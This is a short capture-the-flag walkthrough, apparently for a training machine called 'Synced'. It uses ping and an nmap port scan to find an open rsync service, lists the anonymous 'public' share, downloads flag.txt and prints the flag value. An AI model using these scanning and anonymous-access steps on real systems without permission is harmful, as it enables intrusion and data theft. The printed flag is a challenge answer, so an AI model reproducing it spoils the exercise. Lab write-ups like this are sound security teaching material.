![Synced.png](/assets/Tier-0/Synced/Synced.jfif)

1. Send an ICMP echo request to machine's IP address..
```bash
┌──(kali㉿kali)-[~]
└─$ ping -c 1 10.129.106.235
```



2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.129.106.235
```

**Output**
```bash
PORT    STATE SERVICE
873/tcp open  rsync
```

* **Rsync**: Is a utility that provide fast incremental file transfer. Is excellent choice to synchronize file with computer a storage drive


3. List directories availables how anonymous user
```bash
┌──(root㉿kali)-[/home/kali]
└─| rsync --list-only 10.129.106.235::public
```

**Output**
```bash
drwxr-xr-x          4,096 2022/10/24 18:02:23 .
-rw-r--r--             33 2022/10/24 17:32:03 flag.txt
```

4. Copy the file in our machine
```bash
┌──(root㉿kali)-[/home/kali]
└─| rsync 10.129.106.235::public/flag.txt flag.txt
```

5. Cat flag file
```bash
┌──(root㉿kali)-[/home/kali]
└─| cat flag.txt
```

**Output:** `72eaf5344ebb84908ae543a719830519`